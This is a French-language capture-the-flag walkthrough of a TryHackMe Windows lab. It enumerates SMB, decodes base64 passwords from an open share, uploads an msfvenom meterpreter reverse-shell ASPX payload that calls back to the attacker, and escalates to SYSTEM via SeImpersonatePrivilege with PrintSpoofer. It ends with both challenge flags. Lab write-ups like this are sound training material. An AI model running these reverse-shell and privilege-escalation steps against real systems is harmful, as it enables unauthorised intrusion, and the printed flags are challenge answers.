You have been assigned to a client that wants a penetration test conducted on an environment due to be released to production in seven days. 

Scope of Work

The client requests that an engineer conducts an assessment of the provided virtual environment. The client has asked that minimal information be provided about the assessment, wanting the engagement conducted from the eyes of a malicious actor (black box penetration test).  The client has asked that you secure two flags (no location provided) as proof of exploitation:

    User.txt
    Root.txt

Additionally, the client has provided the following scope allowances:

    Any tools or techniques are permitted in this engagement, however we ask that you attempt manual exploitation first
    Locate and note all vulnerabilities found
    Submit the flags discovered to the dashboard
    Only the IP address assigned to your machine is in scope
    Find and report ALL vulnerabilities (yes, there is more than one path to root)

(Roleplay off)
I encourage you to approach this challenge as an actual penetration test. Consider writing a report, to include an executive summary, vulnerability and exploitation assessment, and remediation suggestions, as this will benefit you in preparation for the eLearnSecurity Certified Professional Penetration Tester or career as a penetration tester in the field.

Note - Nothing in this room requires Metasploit


# User Flag

[IP_VPN] : 10.10.94.166
[IP_MACHINE] : 10.10.54.235


[Ennumération]
Je fais un nmap pour voir les ports disponibles :

Fichier nmap 

```PORT     STATE SERVICE       VERSION
80/tcp   open  http          Microsoft IIS httpd 10.0
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp  open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp open  ms-wbt-server Microsoft Terminal Services
```
On peut voir que le port 445 est ouvert, ce port sert pour le protocole SMB.
Je vais donc rechercher les différents utilisateurs présents sur le SMB

```
smbclient -L //[IP_MACHINE] > smbclientL.txt 


        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        nt4wrksv        Disk
```

On remarque qu'il y a un partage qui s'appelle **nt4wrksv**
Je vais voir ce qu'il y a dedans

``` 
smbclient //[IP_MACHINE]/nt4wrksv

smb: \> ls
  .                                   D        0  Sat Jul 25 17:46:04 2020
  ..                                  D        0  Sat Jul 25 17:46:04 2020
  passwords.txt                       A       98  Sat Jul 25 11:15:33 2020

smb: \> get passwords.txt
getting file \passwords.txt of size 98 as passwords.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)
```
On peut voir qu'un fichier password.txt est présent. 
Regardons ce qu'il y a dedans :

```
cat passwords.txt        

[User Passwords - Encoded]

Qm9iIC0gIVBAJCRXMHJEITEyMw==
QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk
```
Des comptes utilisateurs sont présent. 

A première vu ce sont des hash en base 64.
Je casse les hash avec la commande base64 -d 
```
echo 'Qm9iIC0gIVBAJCRXMHJEITEyMw==' | base64 -d

Bob - !P@$$W0rD!123

echo 'QmlsbCAtIEp1dzRubmFNNG40MjA2OTY5NjkhJCQk' | base64 -d             

Bill - Juw4nnaM4n420696969!$$$ 
```
On récupère donc 2 identifiants mais on ne peut pas s'en servir pour le moment. 
Je les garde de côté. 

[Exploitation] 
Comme j'ai vu qu'il y a un share smb et que j'y ai accès, je vais charger un revershell avec msfvenom
```
msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=[IP_VPN] lport=1234 -f aspx -o shell.aspx
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 200774 bytes
Final size of aspx file: 1014994 bytes
Saved as: shell.aspx
```
Sur le share samba : 
 
```
put shell.aspx

putting file shell.aspx as \shell.aspx (416.5 kb/s) (average 416.5 kb/s)
```
Je lance un meterpreter 

```
msfconsole 

use multi/handler 

set lhost [IP_VPN]

set lport 1234

run
```
j'essaye de récupérer le fichier via la commande curl 

```
curl http://10.10.230.215:49663/nt4wrksv/shell.aspx
```
Hop, j'obtient maintenant un shell meterpreter. 

Je sais que je me trouve dans le dossier : 

```
meterpreter > ls
Listing: c:\windows\system32\inetsrv                                                                                
====================================
```

Je veux voir les utilisateurs présents alors je remonte au dossier "c:/users"
```
meterpreter > ls
Listing: c:\users
=================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  8192  dir   2020-07-25 11:05:52 -0400  .NET v4.5
040777/rwxrwxrwx  8192  dir   2020-07-25 11:05:49 -0400  .NET v4.5 Classic
040777/rwxrwxrwx  8192  dir   2020-07-25 13:30:12 -0400  Administrator
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  All Users
040777/rwxrwxrwx  0     dir   2020-07-25 17:03:44 -0400  Bob
040555/r-xr-xr-x  0     dir   2020-07-25 13:55:45 -0400  Default
040777/rwxrwxrwx  0     dir   2016-07-16 09:34:35 -0400  Default User
040555/r-xr-xr-x  4096  dir   2020-07-25 10:58:09 -0400  Public
100666/rw-rw-rw-  174   fil   2016-07-16 09:21:29 -0400  desktop.ini
```
Je sais qu'il y a 2 utilisateurs qui m'intéressent, **Bob** et **Administrator**
Je vais commencer par rentrer dans le dossier de Bob 

```
meterpreter > cd Bob
lsmeterpreter > ls
Listing: c:\users\Bob
=====================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
040777/rwxrwxrwx  0     dir   2020-07-25 17:04:05 -0400  Desktop

meterpreter > cd Desktop\\
meterpreter > ls
Listing: c:\users\Bob\Desktop
=============================

Mode              Size  Type  Last modified              Name
----              ----  ----  -------------              ----
100666/rw-rw-rw-  35    fil   2020-07-25 11:24:43 -0400  user.txt

meterpreter > cat user.txt
THM{fdk4ka34vk346ksxfr21tg789ktf45}
```
Hop Je récupère le flag user.txt 

Réponse 1 : **THM{fdk4ka34vk346ksxfr21tg789ktf45}**

# Root Flag

On va voir quels sont les droits dont je dispose : avec la commande getprivs
```
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeAssignPrimaryTokenPrivilege
SeAuditPrivilege
SeChangeNotifyPrivilege
SeCreateGlobalPrivilege
SeImpersonatePrivilege
SeIncreaseQuotaPrivilege
SeIncreaseWorkingSetPrivilege
```
Je dispode du privilège **SeImpersonatePrivilege** qui permet : « Emprunter l’identité d’un client après l’authentification » 

Intéréssant !

Regardon sur internet comment exploiter ce privilège. 

D'après la toile, il faut utiliser **PrintSpoofer.exe** qui permetterait d'exploiter le privilège d'usurpation d'identité pour obtenir un jeton SYSTEM, puis exécuter une commande personnalisée avec CreateProcessAsUser() 
Je vais donc récupérer le fichier PrintSpoofer.exe via github : 

[Github][https://github.com/k4sth4/PrintSpoofer/blob/main/PrintSpoofer.exe]

Je vais le mettre sur le serveur samba 

```
put PrintSpoofer.exe

putting file PrintSpoofer.exe as \PrintSpoofer.exe (165.6 kb/s) (average 71.7 kb/s)
```
Je vais me rendre, avec le meterpreter, dans le dossier ou à été téléchargé le fichier et je vais lancer un shell.  
```
cd c:\inetpub\wwwroot\nt4wrksv

shell
```
Comme le dit le README.md présent sur la page Github, il faut jouer cette commande : 
```
PrintSpoofer.exe -i -c powershell.exe
```
Je vais voir qui je suis 

```
PS C:\Windows\system32> whoami
whoami
nt authority\system
```
Parfait ! Plus qu'à aller trouver le flag root.txt 

Comme le flag user.txt se trouvait sur le bureau de Bob, j'imagine que celui du root est aussi sur son Bureau : 

```
PS C:\Users\Administrator\Desktop> type root.txt
type root.txt
THM{1fk5kf469devly1gl320zafgl345pv}

```
Réponse 2 : **THM{1fk5kf469devly1gl320zafgl345pv}**

[POWN3D] 
